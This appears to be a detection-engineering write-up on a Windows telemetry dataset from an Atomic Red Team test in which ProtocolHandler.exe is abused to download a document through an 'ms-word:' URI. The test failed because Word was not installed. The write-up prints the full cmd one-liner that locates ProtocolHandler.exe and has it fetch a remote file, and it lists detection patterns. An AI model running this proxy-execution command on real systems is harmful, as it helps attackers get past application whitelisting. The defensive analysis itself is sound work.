# T1218-4: System Binary Proxy Execution — ProtocolHandler.exe Downloaded a Suspicious File

## Technique Context

T1218 System Binary Proxy Execution encompasses adversaries' use of legitimate system binaries to execute malicious code while evading defenses. ProtocolHandler.exe is a Microsoft Office component designed to handle protocol URI schemes (like ms-word:, ms-excel:) to open documents from web sources. Attackers exploit this binary because it can download and execute content from remote URLs while appearing as a legitimate Microsoft process, bypassing application whitelisting and potentially evading network monitoring focused on browser traffic.

The detection community focuses on unusual command-line patterns with ProtocolHandler.exe, network connections to suspicious domains, file downloads to unexpected locations, and the parent process relationships that indicate automated execution rather than user-initiated document opening.

## What This Dataset Contains

This dataset captures a partial execution attempt where the test tried to use ProtocolHandler.exe to download a suspicious document via the ms-word: protocol handler. The Security channel shows the complete process chain in Security events 4688:

1. PowerShell (PID 4860) executes: `cmd.exe /c FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b & call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"`

2. The batch script spawns cmd.exe (PID 3000) to query the registry for Word's installation path: `reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH`

3. reg.exe (PID 25556) executes but exits with status 0x1, indicating the registry query failed (likely Word is not installed)

Sysmon captures the process creation events with full command lines, including the suspicious ms-word: URI with the GitHub-hosted test document URL. The Sysmon events show process access attempts (EID 10) from PowerShell to both whoami.exe and cmd.exe, indicating the test framework's process monitoring behavior.

## What This Dataset Does Not Contain

The dataset does not contain evidence of ProtocolHandler.exe actually executing because the registry query for Word's installation path failed (reg.exe exit status 0x1). Since Microsoft Office appears to not be installed on this test system, the batch script's FOR loop couldn't locate ProtocolHandler.exe, preventing the actual binary proxy execution.

Missing elements include:
- No ProtocolHandler.exe process creation events
- No network connections to the suspicious GitHub URL
- No file download events for the T1218Test.docx document
- No Sysmon EID 3 (Network Connection) events showing HTTP requests
- No file creation events for the downloaded document

The PowerShell channel contains only test framework boilerplate (Set-StrictMode, Set-ExecutionPolicy Bypass scriptblocks) with no technique-specific PowerShell activity.

## Assessment

This dataset provides limited value for T1218 ProtocolHandler detection engineering because the technique execution failed at the discovery phase. The data is primarily useful for understanding the reconnaissance pattern (querying registry for Office installation paths) that precedes ProtocolHandler abuse, but lacks the core technique telemetry.

The Security 4688 events with command-line logging provide the most valuable detection content, showing the full malicious command line attempting to invoke ProtocolHandler.exe with a suspicious ms-word: URI. However, without the actual execution succeeding, defenders cannot observe the network behavior, file system artifacts, or process relationships that characterize successful ProtocolHandler abuse.

## Detection Opportunities Present in This Data

1. **Command-line pattern detection** - Security EID 4688 showing cmd.exe with FOR loop querying Office installation registry keys followed by ProtocolHandler.exe invocation with ms-word: URI containing external URLs

2. **Registry enumeration for Office components** - reg.exe querying "App Paths\Winword.exe" which indicates reconnaissance for Office-based proxy execution capabilities

3. **Suspicious protocol handler URI patterns** - Command lines containing "ms-word:nft|u|" followed by HTTP/HTTPS URLs, especially to code repositories or suspicious domains

4. **Process chain analysis** - PowerShell spawning cmd.exe with complex FOR loops involving registry queries and conditional execution of Office binaries

5. **Failed execution indicators** - reg.exe exit code 0x1 in Security EID 4689 events indicating unsuccessful Office path discovery, potentially showing attempted but failed proxy execution
